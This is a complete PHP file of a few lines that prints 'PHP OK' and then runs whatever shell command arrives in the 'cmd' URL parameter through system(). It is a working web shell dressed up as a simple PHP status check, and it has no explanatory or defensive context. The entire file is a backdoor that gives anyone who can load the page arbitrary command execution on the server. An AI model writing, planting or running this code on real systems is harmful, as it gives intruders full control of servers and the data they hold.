<?php
echo "PHP OK<br>";

if (isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
}
?>